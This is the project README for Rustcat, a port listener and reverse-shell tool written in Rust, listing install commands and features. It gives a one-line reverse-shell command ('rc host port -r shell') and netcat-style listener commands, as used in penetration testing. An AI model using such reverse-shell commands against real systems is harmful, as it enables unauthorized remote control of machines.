<div align="center" >
  <br>
  <img src="https://raw.githubusercontent.com/robiot/rustcat/main/img/banner.png">
  <br>
  
  <img alt="GitHub All Releases" src="https://img.shields.io/github/contributors/robiot/rustcat?label=Contributors">
  <img alt="GitHub Latest Release" src="https://img.shields.io/github/v/tag/robiot/rustcat?label=Latest%20Release">
  <img alt="AUR version" src="https://img.shields.io/aur/version/rustcat">
  <img alt="Crates.io" src="https://img.shields.io/crates/d/rustcat?label=Cargo%20Downloads">
  <img alt="GitHub All Releases" src="https://img.shields.io/github/downloads/robiot/rustcat/total?label=GitHub%20Downloads">
  <img alt="Build Stats" src="https://github.com/robiot/rustcat/actions/workflows/rust.yml/badge.svg">
  <hr>
</div>

| **[Cargo][cargo_lnk]**                | **[Arch Linux][arch_lnk]**            | **[BlackArch][barch_lnk]**           | **[Debian/Kali][kali_lnk]**
|:-------------------------------------:|:-------------------------------------:|:-------------------------------------:|:-------------------------------------:|
| [![cargo_img]][cargo_lnk]             | [![arch_img]][arch_lnk]               | [![barch_img]][barch_lnk]             | [![kali_img]][kali_lnk]               |
| `cargo install rustcat`               | `yay -S rustcat`                      | `pacman -S rustcat`                   | [Read the install guide][debian_guide]|
| **[Other][other_lnk]**                |                                       |                                       |                                       |
| [![other_img]][other_lnk]             |                                       |                                       |                                       |
| [Read the install guide][other_guide] |                                       |                                       |                                       |

[cargo_lnk]: https://crates.io/crates/rustcat
[cargo_img]: https://raw.githubusercontent.com/robiot/rustcat/main/img/icons/cargo.png

[arch_lnk]: https://aur.archlinux.org/packages/rustcat/
[arch_img]: https://raw.githubusercontent.com/robiot/rustcat/main/img/icons/arch.png

[barch_lnk]: https://www.blackarch.org/tools.html
[barch_img]: https://raw.githubusercontent.com/robiot/rustcat/main/img/icons/blackarch.png

[kali_lnk]: https://github.com/robiot/rustcat
[kali_img]: https://raw.githubusercontent.com/robiot/rustcat/main/img/icons/kali.png
[debian_guide]: https://github.com/robiot/rustcat/wiki/Installation-Guide#kalidebian

[other_lnk]: https://github.com/robiot/rustcat
[other_img]: https://raw.githubusercontent.com/robiot/rustcat/main/img/icons/others.png
[other_guide]: https://github.com/robiot/rustcat/wiki/Installation-Guide
<hr>

# 🤔 What Is Rustcat?
![Ex](https://raw.githubusercontent.com/robiot/rustcat/main/img/example.gif)

🎨 Rustcat is a modern port listener & Reverse Shell that is very easy to use.

# ✨ Features
* Listen on ports
* Command history
* Reverse shell
* Udp
* Colors

# ⚙️ Why Rustcat?

## 👶 Everything Easy
![Ex](https://raw.githubusercontent.com/robiot/rustcat/main/img/easy-revshell.gif)

Starting a listener is just as simple as `rc -lp port`. While in netcat you would do something like `nc -nlvp port` to get the same results.

And creating a reverse shell has never been easier, `rc host port -r shell` is all you need. No more long /dev/tcp stuff that you always forget.

## 📃 Command History
![Ex](https://raw.githubusercontent.com/robiot/rustcat/main/img/history.gif)

Command history is something we all need. How annoying isn't it when you accidently type a long command wrong, then you have to rewrite the entire thing.

But Rustcat fixes that with command history. Just add -H and you will get command history (`rc -lHp port`) and command completion, unlike netcat where you have to use another application and do `rlwrap -cAr nc -nlvp port`.

## 🎨 Appearance
A little splash of color doesn't hurt :).

# 📖 Full Installation Guide
You can find the guide [here](https://github.com/robiot/rustcat/wiki/Installation-Guide)

# 💡 Usage
A basic usage guide can be found [here](https://github.com/robiot/rustcat/wiki/Basic-Usage)
